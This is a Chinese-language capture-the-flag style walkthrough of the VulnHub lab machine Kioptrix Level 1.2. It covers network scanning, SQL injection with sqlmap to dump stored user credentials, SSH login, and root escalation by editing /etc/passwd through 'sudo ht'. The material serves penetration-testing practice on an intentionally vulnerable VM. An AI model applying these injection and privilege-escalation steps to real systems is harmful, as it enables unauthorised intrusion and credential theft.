# 原创
：  VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2

# VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2

#### VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/kioptrix/KVM3.rar)


## KIOPTRIX: LEVEL 1靶机搭建

> 
将下载好的靶机导入Vmware，网络连接设置为NAT模式即可


## 渗透测试

### 信息搜集

> 
用arp-scan探测一下网段内目标靶机的IP：`sudo arp-scan -l`<br/> 得到目标靶机的IP为：`192.168.246.135`


> 
用Nmap探测一下目标靶机IP的端口信息：`sudo nmap -sS -A 192.168.246.135`，发现开放了22和80两个端口


> 
用dirb扫描一下web目录：`dirb http://192.168.246.135`


### 漏洞挖掘

> 
测试后发现需要添加一个host


> 
发现`http://192.168.246.135/gallery/gallery.php?id=1`存在SQL注入漏洞


> 
利用sqlmap得到数据库名：`sqlmap -u http://192.168.246.135/gallery/gallery.php?id=1 --dbs`


> 
利用sqlmap得到gallery数据库中的表名：`sqlmap -u http://192.168.246.135/gallery/gallery.php?id=1 -D gallery --tables`


> 
利用sqlmap得到gallery数据库中的表名：`sqlmap -u http://192.168.246.135/gallery/gallery.php?id=1 -D gallery -T gallarific_users --columns`


> 
得到一组用户名和密码：`admin:n0t7t1k4`


> 
在另一个表`dev_accounts`中，得到了两组用户名和密码


```
dreg：Mast3r
loneferret：starwars

```

### getshell

> 
利用上述得到的信息，发现后两组用户名和密码可以成功连接ssh


### 提权

> 
查看`/etc/passwd`发现`loneferret`用户存在利用点


> 
查看`loneferret`用户家目录下信息


> 
根据提示，使用`sudo ht`命令，修改`/etc/passwd`中loneferret用户和root用户一样


> 
重新连接ssh，发现成功提权到root用户

